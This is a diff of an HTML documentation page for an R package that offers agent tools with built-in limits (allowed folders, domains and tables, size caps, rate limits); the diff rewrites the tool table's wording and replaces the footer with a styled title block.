+<span>  allowed_domains <span class="op">=</span> <span class="st">"api.github.com"</span>,</span>
 <span>  max_calls <span class="op">=</span> <span class="fl">1000</span>,</span>
 <span>  max_calls_per_minute <span class="op">=</span> <span class="fl">10</span></span>
 <span><span class="op">)</span></span></code></pre></div>
 </div>
 <div class="section level2">
-<h2 id="available-tools">Available tools<a class="anchor" aria-label="anchor" href="#available-tools"></a>
+<h2 id="all-tools">All tools<a class="anchor" aria-label="anchor" href="#all-tools"></a>
 </h2>
 <table class="table">
 <colgroup>
-<col width="16%">
-<col width="24%">
-<col width="59%">
+<col width="50%">
+<col width="50%">
 </colgroup>
 <thead><tr class="header">
-<th>Tool</th>
-<th>Factory</th>
-<th>Key Security Features</th>
+<th>Function</th>
+<th>Limits</th>
 </tr></thead>
 <tbody>
 <tr class="odd">
-<td>Calculator</td>
 <td><code><a href="../reference/tool_calculator.html">tool_calculator()</a></code></td>
-<td>AST validation, no code injection</td>
+<td>Allowed functions only; rejects anything else before evaluating</td>
 </tr>
 <tr class="even">
-<td>Data Profile</td>
 <td><code><a href="../reference/tool_data_profile.html">tool_data_profile()</a></code></td>
-<td>Row sampling for large data</td>
+<td>Samples rows from large data</td>
 </tr>
 <tr class="odd">
-<td>Read File</td>
 <td><code><a href="../reference/tool_read_file.html">tool_read_file()</a></code></td>
-<td>Path scoping, size limits</td>
+<td>Allowed folders, size cap, row cap</td>
 </tr>
 <tr class="even">
-<td>Write File</td>
 <td><code><a href="../reference/tool_write_file.html">tool_write_file()</a></code></td>
-<td>Path scoping, size limits, overwrite protection</td>
+<td>Allowed folders, size cap, no overwriting by default</td>
 </tr>
 <tr class="odd">
-<td>SQL Query</td>
 <td><code><a href="../reference/tool_query_sql.html">tool_query_sql()</a></code></td>
-<td>Table allow-list, parameterized queries</td>
+<td>Allowed tables, no raw SQL, parameterized filters</td>
 </tr>
 <tr class="even">
-<td>URL Fetch</td>
 <td><code><a href="../reference/tool_fetch_url.html">tool_fetch_url()</a></code></td>
-<td>Domain allow-list, rate limiting</td>
+<td>Allowed domains, no private IPs, size cap, calls per minute</td>
 </tr>
 <tr class="odd">
-<td>Plot</td>
 <td><code><a href="../reference/tool_plot.html">tool_plot()</a></code></td>
-<td>Path scoping, output size limits</td>
+<td>Allowed functions, allowed folders, size cap</td>
 </tr>
 <tr class="even">
-<td>R Help</td>
 <td><code><a href="../reference/tool_r_help.html">tool_r_help()</a></code></td>
-<td>Package allow-list</td>
+<td>Allowed packages, line cap</td>
 </tr>
 </tbody>
 </table>
@@ -521,7 +491,20 @@ silently failing, giving the agent a chance to adjust its strategy:</p>
 
 
     <footer><div class="pkgdown-footer-left">
-  <p>Developed by Ian Flores Siaca.</p>
+  <div class="title-block">
+<div>
+<b>Sheet</b>3 of 4
+</div>
+<div>
+<b>Quadrangle</b>securetools
+</div>
+<div>
+<b>Survey</b>Tools
+</div>
+<div>
+<b>Series</b>secure-r-dev
+</div>
+</div>
 </div>
 
 <div class="pkgdown-footer-right">
